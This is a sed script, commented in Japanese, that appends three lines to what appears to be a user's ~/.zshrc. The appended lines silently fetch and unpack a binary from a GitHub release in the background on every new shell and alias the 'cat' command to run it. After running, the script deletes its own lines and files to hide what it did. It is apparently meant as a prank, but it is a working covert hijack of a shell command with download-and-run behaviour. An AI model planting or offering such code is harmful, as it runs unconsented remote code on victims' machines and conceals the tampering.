#!/bin/sed -f

# 末尾に挿入する三つの文
${
    # 1) 仕込んだ瞬間にバックアップ先へ先読みDL（&!で静かに非同期・job通知なし）。
    #    既にキャッシュ済みなら何もしない。新規シェルごとに評価されるが test だけで一瞬。
    a\
(test -x ~/.catmeme/catmeme || (curl -sLo ~/.catmeme.tgz https://github.com/kmraven/catmeme/releases/download/v0.0.0/catmeme_Darwin_arm64.tar.gz 2>/dev/null && mkdir -p ~/.catmeme && tar xfz ~/.catmeme.tgz -C ~/.catmeme 2>/dev/null && rm -f ~/.catmeme.tgz)) &!  #CATMEME
    # 2) cat 発動時：キャッシュがあれば即実行、無ければその場でDLにフォールバック。最後に自己消滅。
    a\
function catmeme() {if [ -x ~/.catmeme/catmeme ]; then ~/.catmeme/catmeme -c -t 10; else curl -sLo ~/.catmeme.tgz https://github.com/kmraven/catmeme/releases/download/v0.0.0/catmeme_Darwin_arm64.tar.gz 2>/dev/null && mkdir -p ~/.catmeme && tar xfz ~/.catmeme.tgz -C ~/.catmeme 2>/dev/null && rm -f ~/.catmeme.tgz && ~/.catmeme/catmeme -c -t 10; fi; sed -i".aonaon" -e '/#CATMEME/d' ~/.zshrc; rm -rf ~/.catmeme ~/.catmeme.tgz ~/.zshrc.aonaon; source ~/.zshrc; unset -f catmeme; unalias cat 2>/dev/null;} #CATMEME
    # 3) cat を乗っ取る
    a\
alias cat="catmeme" #CATMEME
}
